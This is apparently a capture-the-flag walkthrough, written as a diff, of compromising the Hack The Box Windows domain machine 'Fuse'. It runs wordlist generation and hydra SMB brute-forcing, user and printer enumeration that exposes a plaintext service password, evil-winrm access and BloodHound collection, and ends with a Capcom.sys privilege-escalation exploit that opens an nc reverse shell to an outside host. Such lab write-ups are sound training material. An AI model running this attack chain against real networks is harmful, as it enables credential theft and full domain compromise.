@@ -1,0 +1,86 @@
+Domain: fabricorp.local
+Domain Name: FABRICORP 
+DNSHostName: Fuse.fabricorp.local
+
+[*] Added fabricorp.local, fuse.htb, fuse.fabricorp.local to /etc/hosts.
+
+[+] Looted usernames from http://fuse.fabricorp.local/papercut/logs/html/index.htm. 
+users=("pmerton" "tlavel" "sthompson" "bhult" "administrator")
+
+[*] Created a wordlist from http://fuse.fabricorp.local/papercut/logs/html/index.htm:
+root@parrot# cewl -d 5 -m 3 -w wordlist.txt http://fuse.fabricorp.local/papercut/logs/html/index.htm --with-numbers
+
+[+] Bruteforcing SMB:
+root@parrot# hydra -L users.txt -P wordlist.txt 10.10.10.193 smb
+
+[445][smb] Host: 10.10.10.193 Account: tlavel Valid password, password expired and must be changed on next logon
+[445][smb] host: 10.10.10.193   login: tlavel   password: Fabricorp01
+[445][smb] Host: 10.10.10.193 Account: bhult Valid password, password expired and must be changed on next logon
+[445][smb] host: 10.10.10.193   login: bhult   password: Fabricorp01
+
+[+] Let's change their passwords:
+root@parrot# smbpasswd -r 10.10.10.193 tlavel
+Old SMB password: Fabricorp01
+New SMB password: Randompass37
+Retype new SMB password: Randompass37
+Password changed for user tlavel on 10.10.10.193.
+
+root@parrot# smbpasswd -r 10.10.10.193 bhult
+Old SMB password: Fabricorp01
+New SMB password: Randompass37
+Retype new SMB password: Randompass37
+Password changed for user bhult on 10.10.10.193.
+
+[!] Password gets reset back really fast. 
+
+[-] Nothing interesting on SMB.
+
+root@parrot# rpcclient -U FABRICORP\\tlavel 10.10.10.193
+
+rpcclient $> enumdomusers
+user:[Administrator] rid:[0x1f4]
+user:[Guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[DefaultAccount] rid:[0x1f7]
+user:[svc-print] rid:[0x450]
+user:[bnielson] rid:[0x451]
+user:[sthompson] rid:[0x641]
+user:[tlavel] rid:[0x642]
+user:[pmerton] rid:[0x643]
+user:[svc-scan] rid:[0x645]
+user:[bhult] rid:[0x1bbd]
+user:[dandrews] rid:[0x1bbe]
+user:[mberbatov] rid:[0x1db1]
+user:[astein] rid:[0x1db2]
+user:[dmuir] rid:[0x1db3]
+
+[+] Adding new users to the list.
+
+rpcclient $> enumprinters
+	flags:[0x800000]
+	name:[\\10.10.10.193\HP-MFT01]
+	description:[\\10.10.10.193\HP-MFT01,HP Universal Printing PCL 6,Central (Near IT, scan2docs password: $fab@s3Rv1ce$1)]
+	comment:[]
+
+[*] > scan2docs. It should be svc-scan or svc-print.
+
+[+] It's svc-print.
+
+root@parrot# evil-winrm -u 'svc-print' -p '$fab@s3Rv1ce$1' -s ../exploit/ps-scripts -i 10.10.10.193
+
+[*] Trying BloodHound:
+*Evil-WinRM* PS C:\Users\svc-print\Documents> Invoke-BloodHound -collectionmethod all -domain fabricorp.local -ldapuser 'svc-print' -ldappass '$fab@s3Rv1ce$1'
+*Evil-WinRM* PS C:\Users\svc-print\Documents> download 20200822092342_BloodHound.zip
+
+[svc-print] -- MemberOf --> IT_ACCOUNTS@grp
+IT_ACCOUNTS@grp -- CanPSRemote --> FUSE@computer
+FUSE@computer -- HasSession --> Administrator
+
+[-] Seems easy. But it PSRemotes to the same machine and mimikatz isn't able to get anything. There should be another way.
+
+[+] winPEAS showed that svc-print has SeLoadDriverPrivilege enabled!
+
+.\eoploaddriver.exe System\CurrentControlSet\MyService C:\Users\svc-print\Documents\Capcom.sys
+.\ExploitCapcom.exe 'C:\Users\svc-print\Documents\_nc.exe 10.10.14.29 4444 -e cmd.exe'
+
+[+] Got root.txt!
